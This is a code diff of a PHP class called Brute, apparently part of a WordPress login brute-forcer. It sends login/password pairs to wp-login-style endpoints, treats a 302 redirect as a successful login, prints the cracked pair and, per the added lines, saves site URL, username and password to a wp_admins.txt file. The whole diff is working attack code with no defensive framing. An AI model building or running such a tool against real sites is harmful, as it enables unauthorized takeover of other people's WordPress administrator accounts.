@@ -32,24 +32,25 @@ class Brute
         $this->url = explode(';', $data['url'])[0];
 
         $this->loginCheck($data);
-        $this->checkIterator($data['login']);
+        $this->checkIterator($data);
 
+        if ($this->iteration === true) {
+            $body = new FormBody;
+            $body->addField('log', $this->login);
+            $body->addField('pwd', $this->password);
 
-        $body = new FormBody;
-        $body->addField('log', $this->login);
-        $body->addField('pwd', $this->password);
+            $request = new Request($this->url, 'POST');
+            $request->setTcpConnectTimeout(2400);
+            $request->setBody($body);
 
-        $request = new Request($this->url, 'POST');
-        $request->setTcpConnectTimeout(2400);
-        $request->setBody($body);
+            $response = yield $this->client->request($request);
 
-        $response = yield $this->client->request($request);
-
-        if ($response->getStatus() == 302) {
-            echo $this->login . ":" . $this->password . PHP_EOL;
-            // тут пишем valid в файл
+            if ($response->getStatus() == 302) {
+                echo $this->login . ":" . $this->password . PHP_EOL;
+                $wp_admin = $this->url . ";" . $this->login . ";" . $this->password;
+                file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL);
+            }
         }
-
     }
 
     public function loginCheck($data) {
@@ -62,8 +63,10 @@ class Brute
         }
     }
 
-    public function checkIterator($login) {
-
+    public function checkIterator($data) {
+        if ($this->login == null || ( $data['login'] != '{login}' && $data['login'] == $this->login )) {
+            $this->iteration = false;
+        }
     }
 
     public function request($url) {
